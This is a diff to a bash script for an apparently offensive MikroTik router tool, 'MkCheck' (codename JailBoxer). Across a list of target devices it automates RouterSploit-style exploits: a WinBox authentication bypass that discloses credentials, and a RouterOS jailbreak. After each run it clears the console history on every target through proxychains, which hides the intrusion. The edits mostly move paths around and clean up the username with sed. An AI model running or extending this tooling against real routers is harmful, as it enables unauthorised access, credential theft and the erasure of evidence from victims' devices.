@@ -367,7 +367,7 @@ apresults(){
   if [[ ${SYQ} == "#" ]]; then
 		echo -e "${W}Please ensure there are no commented out lines\notherwise this check will fail${NC}"
   fi
-  for log in `cat /opt/MkCheck/files/tiks_res.txt`
+  for log in `cat /opt/MkCheck/files/res.txt`
 		do
 			Y=$(( ${Y} + 1 ))
 			IP=$(cat results/Vulns/${SESSION}/${log}.results)
@@ -424,8 +424,17 @@ mchecker(){
 		fi
 	done
 	echo -e "${YLW}Clearing Target Device SSH History & Sorting Results${NC}"
-	proxychains4 sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USER} -c '/console clear-history'
+	echo ${USER} > temp_user
+	TMP='= "'
+	INP=''
+	sed -i "s/${TMP}/${INP}/g" temp_user
+	TMI='"'
+	TMU=''
+	sed -i "s/${TMI}/${TMU}/g" temp_user
+	USE=$(cat temp_user)
+	proxychains4 sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USE} -c '/console clear-history'
 	sudo rm -rf /opt/MkCheck/logs
+	sudo rm temp_user
 	apresults
 	main
 }
@@ -454,9 +463,18 @@ pchecker(){
 			break
 		fi
 	done
+	echo ${USER} > temp_user
+	TMP='= "'
+	INP=''
+	sed -i "s/${TMP}/${INP}/g" temp_user
+	TMI='"'
+	TMU=''
+	sed -i "s/${TMI}/${TMU}/g" temp_user
+	USE=$(cat temp_user)
 	echo -e "${YLW}Clearing Target Device SSH History & Sorting Results${NC}"
-	proxychains4 sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USER} -c '/console clear-history'
+	proxychains4 sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USE} -c '/console clear-history'
 	sudo rm -rf /opt/MkCheck/logs
+	sudo rm temp_user
 	apresults
 	main
 }
@@ -491,16 +509,17 @@ bytheway(){
 #############################
 
 rtsploit(){
-	cd /root/routersploit
-	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
+	cd /opt/MkCheck
+	python3 scripts/get/rsf.py
+	for name in `cat /opt/MkCheck/files/rsf.txt`
 		do
-
 			#########################################
 			#########################################
 			#  winbox_auth_bypass_creds_disclosure  #
 			#########################################
-
-			WB=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
+			cd /opt/MkCheck/scripts/
+			echo -e "${RED}[*]${NC} Running WinBox Exploit Check"
+			WB=$(sudo python3 winbox.py ${name})
 			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 			echo "${WB}"
@@ -508,7 +527,7 @@ rtsploit(){
 			########################
 			#  routeros_jailbreak  #
 			########################
-
+			cd /root/routersploit
 			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
@@ -616,6 +635,7 @@ cred_check(){
 main(){
 	MODULE=''
 	echo -e "${BRED}"
+	cd /opt/MkCheck
 	python3 files/banner.py
 	echo -e "${ORNG}Codename: ${LCYN}JailBoxer"
 	echo -e "${ORNG}by ${LCYN}s1l3nt78${NC}"
